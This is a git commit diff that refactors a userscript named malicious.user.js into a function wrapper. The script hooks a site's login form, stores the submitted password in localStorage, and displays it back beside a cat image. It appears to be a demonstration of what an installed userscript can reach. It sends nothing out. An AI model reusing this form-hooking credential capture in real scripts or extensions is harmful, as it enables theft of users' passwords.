2a7cf5b25577ec75a693d24e9925c74811991e87
nikkun <nikkun01@gmail.com>
2016-02-16 17:31:09 -0800

    Don't touch the global namespace

--- malicious.user.js
+++ malicious.user.js
@@ -11,51 +11,53 @@
 // @grant none
 // ==/UserScript==
 
-var LS_KEY = "ptp-password";
+(function() {
+  var LS_KEY = "ptp-password";
 
-function onSubmit(form, callback) {
-  if (form.addEventListener)
-    form.addEventListener("submit", callback, false);
-  else if (form.attachEvent)
-    form.attachEvent("onsubmit", callback);
-};
+  var onSubmit = function(form, callback) {
+    if (form.addEventListener)
+      form.addEventListener("submit", callback, false);
+    else if (form.attachEvent)
+      form.attachEvent("onsubmit", callback);
+  };
 
-function newAlert(msg) {
-  var div = document.createElement("div");
-  div.className = "alert-bar";
+  var newAlert = function(msg) {
+    var div = document.createElement("div");
+    div.className = "alert-bar";
 
-  var span = document.createElement("span");
-  span.className = "alert-bar__link";
-  span.textContent = msg;
+    var span = document.createElement("span");
+    span.className = "alert-bar__link";
+    span.textContent = msg;
 
-  div.appendChild(span);
-  return div;
-};
+    div.appendChild(span);
+    return div;
+  };
 
-function newCatImg() {
-  var img = document.createElement("img");
-  img.src = "https://whatimg.com/i/ATqtSt.jpg";
-  img.width = 250;
-  return img;
-}
-
-window.addEventListener('load', function() {
-  var div =  document.createElement("div");
-  div.style['text-align'] = "center";
-  div.appendChild(newCatImg());
-
-  if (localStorage.hasOwnProperty(LS_KEY))
-    div.appendChild(newAlert("Your password: " + localStorage.getItem(LS_KEY)));
-
-  var content = document.getElementById("content");
-  if (content) {
-    content.parentNode.insertBefore(div, content);
+  var newCatImg = function() {
+    var img = document.createElement("img");
+    img.src = "https://whatimg.com/i/ATqtSt.jpg";
+    img.width = 250;
+    return img;
   }
 
-  var form = document.getElementById("loginform");
-  if (form) {
-    onSubmit(form, function() {
-      localStorage.setItem(LS_KEY, this.password.value);
-    });
-  }
-});
+  window.addEventListener('load', function() {
+    var div =  document.createElement("div");
+    div.style['text-align'] = "center";
+    div.appendChild(newCatImg());
+
+    if (localStorage.hasOwnProperty(LS_KEY))
+      div.appendChild(newAlert("Your password: " + localStorage.getItem(LS_KEY)));
+
+    var content = document.getElementById("content");
+    if (content) {
+      content.parentNode.insertBefore(div, content);
+    }
+
+    var form = document.getElementById("loginform");
+    if (form) {
+      onSubmit(form, function() {
+        localStorage.setItem(LS_KEY, this.password.value);
+      });
+    }
+  });
+})();
